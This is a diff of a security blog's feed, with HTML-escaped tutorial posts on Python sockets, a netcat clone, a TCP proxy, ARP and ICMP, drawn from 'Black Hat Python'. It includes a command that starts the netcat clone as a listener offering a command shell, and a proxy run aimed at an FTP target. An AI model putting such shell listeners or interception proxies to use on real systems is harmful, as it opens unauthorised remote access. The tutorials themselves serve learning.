-&lt;/ul&gt;</summary><category term="Python"></category><category term="paramiko"></category><category term="SSH"></category><category term="PyCrypto"></category><category term="getopt"></category><category term="threading"></category><category term="socket"></category><category term="Book"></category></entry><entry><title>A Guide to Python's Socket Module</title><link href="http://bt3gl.github.io/a-guide-to-pythons-socket-module.html" rel="alternate"></link><updated>2014-12-10T00:00:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-12-10:a-guide-to-pythons-socket-module.html</id><summary type="html">&lt;p&gt;Last week I got my copy of &lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;, the new &lt;a href="https://twitter.com/jms_dot_py"&gt;Justin Seitz&lt;/a&gt;'s book. The compilation talks about network programing, web hacking, and Windows exploitation. All in Python!&lt;/p&gt;
+&lt;/ul&gt;</summary><category term="Python"></category><category term="paramiko"></category><category term="SSH"></category><category term="PyCrypto"></category><category term="getopt"></category><category term="threading"></category><category term="socket"></category><category term="Book"></category></entry><entry><title>Black Hat Python Networking: The Socket Module</title><link href="http://bt3gl.github.io/black-hat-python-networking-the-socket-module.html" rel="alternate"></link><updated>2014-12-10T00:00:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-12-10:black-hat-python-networking-the-socket-module.html</id><summary type="html">&lt;p&gt;Last week I got my copy of &lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;, the new &lt;a href="https://twitter.com/jms_dot_py"&gt;Justin Seitz&lt;/a&gt;'s book. The compilation talks about network programing, web hacking, and Windows exploitation. All in Python!&lt;/p&gt;
 &lt;p&gt;I have been wanting to write about Python's network resources for a while and now this is my chance! In this first post I discuss Python's &lt;a href="https://docs.python.org/2/library/socket.html"&gt;socket&lt;/a&gt; module, which  contains all the tools to write &lt;a href="http://en.wikipedia.org/wiki/Transmission_Control_Protocol"&gt;TCP&lt;/a&gt;/&lt;a href="http://en.wikipedia.org/wiki/User_Datagram_Protocol"&gt;UDP&lt;/a&gt; clients and servers, including &lt;a href="http://en.wikipedia.org/wiki/Raw_socket"&gt;raw sockets&lt;/a&gt;. It's really nice! &lt;strong&gt;T-1000&lt;/strong&gt; is loving it!&lt;/p&gt;
 &lt;p&gt;Ah, by the way, all the source codes in this post are available at &lt;a href="https://github.com/bt3gl/My-Gray-Hacker-Resources"&gt;my repo&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="" src="http://i.imgur.com/l3iyyOO.jpg" /&gt;&lt;/p&gt;
@@ -1376,17 +1311,17 @@ Enter &lt;span class="nb"&gt;command&lt;/span&gt;:
 &lt;li&gt;the &lt;em&gt;server is always waiting for us to send data first&lt;/em&gt; (as oppose to servers that expect to send data and then wait for response), and&lt;/li&gt;
 &lt;li&gt;the server will always send us data back in a &lt;em&gt;short time&lt;/em&gt;.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;Let's run this script (notice that we might get 301 &lt;em&gt;Moved Permanently&lt;/em&gt; or &lt;em&gt;Permanent Redirected&lt;/em&gt;, which tells the browser to go to HTTPs or to include &lt;em&gt;www&lt;/em&gt;):&lt;/p&gt;
+&lt;p&gt;Let's run this script (notice that we get &lt;em&gt;Moved Permanently&lt;/em&gt; because Google  issues HTTPS connections):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; python tcp_client.py
-HTTP/1.1 301 Moved Permanently
+HTTP/1.1 &lt;span class="m"&gt;301&lt;/span&gt; Moved Permanently
 Location: http://www.google.com/
-Content-Type: text/html; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;UTF-8
-Date: Mon, 15 Dec 2014 16:52:46 GMT
-Expires: Wed, 14 Jan 2015 16:52:46 GMT
+Content-Type: text/html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;UTF-8
+Date: Mon, &lt;span class="m"&gt;15&lt;/span&gt; Dec &lt;span class="m"&gt;2014&lt;/span&gt; 16:52:46 GMT
+Expires: Wed, &lt;span class="m"&gt;14&lt;/span&gt; Jan &lt;span class="m"&gt;2015&lt;/span&gt; 16:52:46 GMT
 Cache-Control: public, max-age&lt;span class="o"&gt;=&lt;/span&gt;2592000
 Server: gws
 Content-Length: 219
-X-XSS-Protection: 1; &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;block
+X-XSS-Protection: 1&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;block
 X-Frame-Options: SAMEORIGIN
 Alternate-Protocol: 80:quic,p&lt;span class="o"&gt;=&lt;/span&gt;0.02
 
@@ -1744,7 +1679,7 @@ ACK
 
 &lt;h3&gt;Firing Up a Server and a Client&lt;/h3&gt;
 &lt;p&gt;Now we can put everything together and run the script as a server in a terminal and as a client in another. Running as a server:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;netcat_awesome.py -l -p 9000 -c
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;netcat_awesome.py -l -p &lt;span class="m"&gt;9000&lt;/span&gt; -c
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -1765,17 +1700,17 @@ NETCAT:
 
 &lt;h3&gt;The Good 'n' Old Request&lt;/h3&gt;
 &lt;p&gt;Additionally, we can use our client to send out requests:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -ne &lt;span class="s2"&gt;&amp;quot;GET / HTTP/1.1\nHost: www.google.com\r\n\r\n&amp;quot;&lt;/span&gt; | python socket/netcat_awesome.py -t www.google.com -p 80
-HTTP/1.1 200 OK
-Date: Tue, 16 Dec 2014 21:04:27 GMT
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -ne &lt;span class="s2"&gt;&amp;quot;GET / HTTP/1.1\nHost: www.google.com\r\n\r\n&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; python socket/netcat_awesome.py -t www.google.com -p 80
+HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
+Date: Tue, &lt;span class="m"&gt;16&lt;/span&gt; Dec &lt;span class="m"&gt;2014&lt;/span&gt; 21:04:27 GMT
 Expires: -1
 Cache-Control: private, max-age&lt;span class="o"&gt;=&lt;/span&gt;0
-Content-Type: text/html; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;ISO-8859-1
-Set-Cookie: &lt;span class="nv"&gt;PREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;ID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;56f21d7bf67d66e0:FF&lt;span class="o"&gt;=&lt;/span&gt;0:TM&lt;span class="o"&gt;=&lt;/span&gt;1418763867:LM&lt;span class="o"&gt;=&lt;/span&gt;1418763867:S&lt;span class="o"&gt;=&lt;/span&gt;cI2xRwXGjb6bGx1u; &lt;span class="nv"&gt;expires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Thu, 15-Dec-2016 21:04:27 GMT; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/; &lt;span class="nv"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;.google.com
-Set-Cookie: &lt;span class="nv"&gt;NID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;67&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;ZGlY0-8CjkGDtTz4WwR7fEHOXGw-VvdI9f92oJKdelRgCxllAXoWfCC5vuQ5lJRFZIwghNRSxYbxKC0Z7ve132WTeBHOCHFB47Ic14ke1wdYGzevz8qFDR80fpiqHwMf; &lt;span class="nv"&gt;expires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Wed, 17-Jun-2015 21:04:27 GMT; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/; &lt;span class="nv"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;.google.com; HttpOnly
+Content-Type: text/html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;ISO-8859-1
+Set-Cookie: &lt;span class="nv"&gt;PREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;ID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;56f21d7bf67d66e0:FF&lt;span class="o"&gt;=&lt;/span&gt;0:TM&lt;span class="o"&gt;=&lt;/span&gt;1418763867:LM&lt;span class="o"&gt;=&lt;/span&gt;1418763867:S&lt;span class="o"&gt;=&lt;/span&gt;cI2xRwXGjb6bGx1u&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;expires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Thu, 15-Dec-2016 21:04:27 GMT&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;.google.com
+Set-Cookie: &lt;span class="nv"&gt;NID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;67&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;ZGlY0-8CjkGDtTz4WwR7fEHOXGw-VvdI9f92oJKdelRgCxllAXoWfCC5vuQ5lJRFZIwghNRSxYbxKC0Z7ve132WTeBHOCHFB47Ic14ke1wdYGzevz8qFDR80fpiqHwMf&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;expires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Wed, 17-Jun-2015 21:04:27 GMT&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;.google.com&lt;span class="p"&gt;;&lt;/span&gt; HttpOnly
 P3P: &lt;span class="nv"&gt;CP&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;This is not a P3P policy! See http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;amp;answer=151657 for more info.&amp;quot;&lt;/span&gt;
 Server: gws
-X-XSS-Protection: 1; &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;block
+X-XSS-Protection: 1&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;block
 X-Frame-Options: SAMEORIGIN
 Alternate-Protocol: 80:quic,p&lt;span class="o"&gt;=&lt;/span&gt;0.02
 Transfer-Encoding: chunked
@@ -1931,7 +1866,7 @@ Transfer-Encoding: chunked
 
 &lt;h3&gt;Firing Up our Proxy&lt;/h3&gt;
 &lt;p&gt;Now we just need to run our script with some server. For example, for a FTP server at the standard port 21:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo ./tcp_proxy.py localhost 21 ftp.target 21 True
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo ./tcp_proxy.py localhost &lt;span class="m"&gt;21&lt;/span&gt; ftp.target &lt;span class="m"&gt;21&lt;/span&gt; True
 &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Listening on localhost:21
 &lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -2088,7 +2023,7 @@ router.&lt;/p&gt;
 &lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Address_Resolution_Protocol"&gt;ARP&lt;/a&gt; is the protocol used to determine which &lt;a href="http://en.wikipedia.org/wiki/MAC_address"&gt;MAC address&lt;/a&gt; (physical address such as 00:09:5B:01:02:03 and belonging to layer 2) corresponds to a particular IP address (logical addresses such as 10.100.20.1, belonging to layer 3).&lt;/p&gt;
 &lt;p&gt;The ARP resolution process uses two packets (&lt;em&gt;ARP request&lt;/em&gt; and  &lt;em&gt;ARP response&lt;/em&gt;) to find the matching MAC address, sending a &lt;strong&gt;broadcast&lt;/strong&gt; packet to every device in the domain, and waiting for the response of the  correct client. This works because  a switch uses a MAC table to know through which port to send the traffic.&lt;/p&gt;
 &lt;p&gt;In Wireshark, ARP is easily spotted with sentences such as &lt;strong&gt;"Who has 192.168.11/ Tell 192.168.1.1"&lt;/strong&gt;. Additionally, you can see the ARP table in your device with:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;arp&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;arp -a
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2143,29 +2078,29 @@ router.&lt;/p&gt;
 &lt;h3&gt;The Internet Control Message Protocol (Layer 3)&lt;/h3&gt;
 &lt;p&gt;ICMP is the utility protocol of TCP/IP responsible for providing information about the availability of devices, services, or routes on a network.&lt;/p&gt;
 &lt;p&gt;Examples of services that use ICMP are  &lt;strong&gt;ping&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ping&lt;/span&gt; &lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;google&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
-&lt;span class="n"&gt;PING&lt;/span&gt; &lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;google&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;74.125.228.210&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="mi"&gt;64&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;iad23s23&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f18&lt;/span&gt;&lt;span class="mf"&gt;.1e100&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;74.125.228.210&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;21.5&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
-&lt;span class="mi"&gt;64&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;iad23s23&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f18&lt;/span&gt;&lt;span class="mf"&gt;.1e100&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;74.125.228.210&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="n"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;22.5&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
-&lt;span class="mi"&gt;64&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;iad23s23&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f18&lt;/span&gt;&lt;span class="mf"&gt;.1e100&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;74.125.228.210&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="n"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;21.4&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ping www.google.com
+PING www.google.com &lt;span class="o"&gt;(&lt;/span&gt;74.125.228.210&lt;span class="o"&gt;)&lt;/span&gt; 56&lt;span class="o"&gt;(&lt;/span&gt;84&lt;span class="o"&gt;)&lt;/span&gt; bytes of data.
+&lt;span class="m"&gt;64&lt;/span&gt; bytes from iad23s23-in-f18.1e100.net &lt;span class="o"&gt;(&lt;/span&gt;74.125.228.210&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;53&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;21.5 ms
+&lt;span class="m"&gt;64&lt;/span&gt; bytes from iad23s23-in-f18.1e100.net &lt;span class="o"&gt;(&lt;/span&gt;74.125.228.210&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;53&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;22.5 ms
+&lt;span class="m"&gt;64&lt;/span&gt; bytes from iad23s23-in-f18.1e100.net &lt;span class="o"&gt;(&lt;/span&gt;74.125.228.210&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;53&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;21.4 ms
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;and &lt;strong&gt;traceroute&lt;/strong&gt; (Windows sends ICMP packets,  Linux sends UDP):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;traceroute&lt;/span&gt; &lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;google&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
-&lt;span class="n"&gt;traceroute&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;google&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;173.194.46.84&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="n"&gt;hops&lt;/span&gt; &lt;span class="n"&gt;max&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt; &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="n"&gt;packets&lt;/span&gt;
- &lt;span class="mi"&gt;1&lt;/span&gt;  &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
- &lt;span class="mi"&gt;2&lt;/span&gt;  &lt;span class="mf"&gt;67.59.254.85&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;67.59.254.85&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;30.078&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;30.452&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;30.766&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
- &lt;span class="mi"&gt;3&lt;/span&gt;  &lt;span class="mf"&gt;67.59.255.137&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;67.59.255.137&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;33.889&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt; &lt;span class="mf"&gt;67.59.255.129&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;67.59.255.129&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;33.426&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt; &lt;span class="mf"&gt;67.59.255.137&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;67.59.255.137&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;34.007&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
- &lt;span class="mi"&gt;4&lt;/span&gt;  &lt;span class="n"&gt;rtr101&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;wan&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hcvlny&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;65.19.107.109&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;34.004&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt; &lt;span class="mi"&gt;451&lt;/span&gt;&lt;span class="n"&gt;be075&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cst&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lightpath&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;65.19.107.117&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;32.743&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt; &lt;span class="n"&gt;rtr102&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;wan&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hcvlny&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;65.19.107.125&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;33.951&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
- &lt;span class="mi"&gt;5&lt;/span&gt;  &lt;span class="mf"&gt;64.15.3.222&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;64.15.3.222&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;34.972&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt; &lt;span class="mf"&gt;64.15.0.218&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;64.15.0.218&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;35.187&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;35.120&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
- &lt;span class="mi"&gt;6&lt;/span&gt;  &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mf"&gt;72.14.215.203&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;72.14.215.203&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;29.225&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;29.646&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
- &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mf"&gt;209.85.248.242&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;209.85.248.242&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;29.361&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt; &lt;span class="mf"&gt;209.85.245.116&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;209.85.245.116&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;39.780&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;42.108&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
